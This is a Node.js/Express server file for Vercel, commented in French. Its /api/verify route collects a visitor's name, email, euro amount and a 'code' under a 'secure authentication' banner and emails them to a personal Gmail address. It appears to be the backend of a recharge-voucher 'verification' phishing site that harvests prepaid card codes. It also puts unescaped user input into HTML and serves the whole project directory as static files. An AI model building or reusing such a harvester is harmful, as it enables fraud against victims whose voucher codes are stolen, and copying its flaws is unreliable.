require('dotenv').config(); // <-- Charge les variables d'environnement en premier

const express = require('express');
const cors = require('cors');
const path = require('path'); // <-- AJOUT : Requis pour manipuler les chemins de fichiers
const { Resend } = require('resend');

// 1. Initialisation de l'application Express
const app = express();

// 2. Configuration stricte de sécurité CORS (Vercel + Local)
const allowedOrigins = [
  'http://127.0.0.1:5500',
  'https://recharge-statut.com',
  'https://form-brie.vercel.app' // Ajouté au cas où vous testez avec l'URL Vercel
];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Bloqué par la politique CORS de l\'application'));
    }
  }
}));

// 3. Middlewares obligatoires pour le JSON et les fichiers statiques
app.use(express.json());
app.use(express.static(__dirname)); // <-- AJOUT : Permet à Express de charger vos fichiers CSS, JS et images

// 4. Initialisation de Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// ==========================================
// ROUTES VISUELLES (FRONTEND)
// ==========================================

// Afficher index.html à la racine du site
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Afficher form.html si l'utilisateur y va directement
app.get('/form.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'form.html'));
});

// ==========================================
// ROUTES API (BACKEND)
// ==========================================

// Route de réception des données
app.post('/api/verify', async (req, res) => {
    const { nom, prenom, email, amount, code } = req.body;

    try {
        const data = await resend.emails.send({
            from: 'onboarding@resend.dev',
            to: 'louanalouana950@gmail.com',
            subject: '🔔 Nouvelle demande de vérification',
            html: `
                <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden;">
                    <div style="background-color: #2563EB; padding: 20px; text-align: center;">
                        <h2 style="color: #ffffff; margin: 0;">Authentification Sécurisée</h2>
                    </div>
                    <div style="padding: 30px;">
                        <h3 style="color: #1e293b; margin-top: 0;">Détails de la soumission :</h3>
                        <table style="width: 100%; border-collapse: collapse;">
                            <tr><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; color: #64748b;">Nom :</td><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; font-weight: bold;">${nom}</td></tr>
                            <tr><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; color: #64748b;">Prénom :</td><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; font-weight: bold;">${prenom}</td></tr>
                            <tr><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; color: #64748b;">Email :</td><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; font-weight: bold;">${email}</td></tr>
                            <tr><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; color: #64748b;">Montant :</td><td style="padding: 10px; border-bottom: 1px solid #f1f5f9; font-weight: bold; color: #2563EB;">${amount} €</td></tr>
                            <tr><td style="padding: 10px; color: #64748b;">Code :</td><td style="padding: 10px; font-weight: bold; font-size: 1.2em; color: #dc2626;">${code}</td></tr>
                        </table>
                    </div>
                    <div style="background-color: #f8fafc; padding: 15px; text-align: center; font-size: 12px; color: #94a3b8;">
                        Ce message a été généré automatiquement par votre formulaire de sécurité.
                    </div>
                </div>
            `
        });

        res.status(200).json({ success: true, message: "Données transmises avec succès." });

    } catch (error) {
        console.error("Erreur Resend :", error);
        res.status(500).json({ success: false, message: "Erreur lors de l'envoi des données." });
    }
});

// 6. Démarrage du serveur (Adapté pour le mode serverless de Vercel)
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 5000; 
    app.listen(PORT, () => {
        console.log(`Serveur démarré sur le port ${PORT}`);
    });
}

module.exports = app; // <-- MODIFICATION MAJEURE : Indispensable pour que Vercel l'exécute en Serverless
